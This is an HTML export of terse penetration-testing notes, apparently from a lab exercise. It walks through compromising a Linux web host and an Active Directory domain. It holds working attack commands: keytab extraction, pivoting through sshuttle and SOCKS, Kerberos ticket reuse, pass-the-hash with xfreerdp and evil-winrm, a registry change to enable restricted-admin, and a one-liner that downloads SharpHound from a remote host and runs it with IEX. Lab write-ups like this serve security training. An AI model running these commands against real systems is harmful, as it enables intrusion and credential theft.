<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>05</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>05</h1><br/><p><h2>Foothold</h2>(164)<ul><li>rce opennetadmin (metasploit better shell)</li><li>sudo -l </li></ul></p><p>Flags : 1891c271e40a292f1fbd5eaffbc0a7f8</p><p></p><p><h2>Recon</h2><ul><li>ls /home</li><li>bash_history (pete@complyedge.com)<ul><li>kinit -V</li></ul></li><li>cat /etc/krb5.conf<ul><li> COMPLYEDGE.com = {</li></ul></li></ul></p><p>   kdc = dmzdc01.complyedge.com</p><p>   default_domain = complyedge.com<ul><li>scp -i root_key root@192.168.175.164:/etc/krb5.keytab .</li></ul></p><p> cat /etc/krb5.keytab<ul><li><strong>will give us hash extraction</strong></li><li><strong><span style="color:#e01b24;">keytabextract.py krb5.keytab</span></strong></li></ul></p><p># comment out proxy_dns in sshuttle</p><p></p><p><em><h2>Lateral movement</h2></em></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># persistence via root </span><br /><br /><span style="color:#0088ff;font-weight:400">## sshuttle (comment out proxy_dns in proxychains.conf)</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> sshuttle -v -e <span style="color:#3ad900;font-weight:400">&quot;ssh -i id_rsa_root&quot;</span> -r root@<span style="color:#3ad900;font-weight:400">&quot;$target1&quot;</span> 172.16.161.0/24 <span style="color:#0088ff;font-weight:400">## failed </span><br /><span style="color:#0088ff;font-weight:400">### alternative proxychains </span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> -i id_rsa_root root@<span style="color:#7f0044;font-weight:400">$target1</span> -D 1080<br /><span style="color:#0088ff;font-weight:400">## list processes</span><br /><span style="color:#ff9d00;font-weight:700">ps</span> aux <br /><span style="color:#ff9d00;font-weight:700">ssh</span> of pete user <br /><span style="color:#0088ff;font-weight:400">### find /tmp/krb5cc_75401103_wWm0AW</span><br /><br /><span style="color:#0088ff;font-weight:400">## enumeration </span><br /><span style="color:#ff9d00;font-weight:700">cat</span> /etc/krb5.conf <br /><span style="color:#0088ff;font-weight:400">## dmzdc01.complyedge.com .168</span><br /><br /><span style="color:#0088ff;font-weight:400">## AD </span><br /><span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">KRB5CCNAME</span>=<span style="color:#3ad900;font-weight:400">&quot;/tmp/krb5cc_75401103_wWm0AW&quot;</span><br /><span style="color:#0088ff;font-weight:400">### enumerate users (sshuttle)</span><br /> python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip  dmzdc01.complyedge.com complyedge.com/pete<br /><span style="color:#0088ff;font-weight:400">## enumerae spns </span><br />python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip  dmzdc01.complyedge.com complyedge.com/pete <br /><br /><br />bloodhound-python -u <span style="color:#3ad900;font-weight:400">&#39;WEB05$&#39;</span> --hashes aad3b435b51404eeaad3b435b51404ee:e269dd0a1821f1b6cc4c023eb5ee0072 -d complyedge.com -ns 172.16.175.168 --dns-tcp -c All<br /><span style="color:#0088ff;font-weight:400">## note use ip in -ns and complyedge.com in hosts</span><br /><br /></pre></div></p><p></p><p></p><p><em><h2>DC01</h2></em></p><p><div class="codebox"><pre> psexec.py -k <span style="color:#7f0044;font-weight:400">$dc</span><br /> <span style="color:#0088ff;font-weight:400">## flag </span><br /> fad50534dfbf83af12c9ba30daef6b8a<br /> <span style="color:#0088ff;font-weight:400">## remove account restriction for pth </span><br /> New-ItemProperty -Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot;</span> -Name DisableRestrictedAdmin -Value 0<br /> <span style="color:#0088ff;font-weight:400">## rdp to dc</span><br /> xfreerdp /u:pete@complyedge.com /pth:61c6e14f88cd70638f901ea51796a194 /v:dmzdc01.complyedge.com +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore<br /></pre></div></p><p><img src="images/359-1.png" alt="images/359-1.png" /></p><p>sid filtering is off so we can&#39;t ue golden ticket attack however we can enumerate  <ul><li>pete is a user in ops.comply.com<ul><li></li></ul></li></ul><img src="images/359-2.png" alt="images/359-2.png" /><ul><li>(New-Object System.Net.WebClient).DownloadString(&#39;<a href="http://192.168.45.160/SharpHound.ps1')">http://192.168.45.160/SharpHound.ps1&#39;)</a> | IEX; Invoke-Bloodhound -CollectionMethod All -OutputDirectory \tmp -Domain ops.comply.com (session of pete)</p><p></li></ul><img src="images/359-3.png" alt="images/359-3.png" /><ul><li>jim a foreign group member on ops.comply.com</li></ul></p><p>evil-winrm -u complyedge.com\\jim -H e48c13cefd8f9456d79cd49651c134e8 -i file06.ops.comply.com</p><p>(admin)<ul><li>flag : <strong>48be5cc0f53c174187a23a4f4b339e5f</strong></li></ul></li><li>file06 has generic write on jump09</p></div>
</body>
</html>
